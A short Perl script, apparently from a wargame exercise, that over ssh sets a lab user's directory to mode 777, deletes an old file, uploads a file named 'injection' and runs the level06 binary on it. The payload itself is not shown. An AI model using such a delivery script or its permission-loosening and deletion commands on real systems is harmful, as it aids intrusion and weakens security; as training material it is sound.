#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";
$user = "level06";

$chmod = "chmod 777 .";
$ssh = "ssh -qp $port $user\@$ip '$chmod && rm -rf injection'";
print $red, $chmod, $reset, "\n";
system($ssh);

$scp = "scp -q -P $port ./injection $user\@$ip:~";
print $green, $scp, $reset, "\n";
system($scp);

$tool = "./$user injection";
print $red, $tool, $reset, "\n";
system("ssh -qp $port $user\@$ip '$tool'");
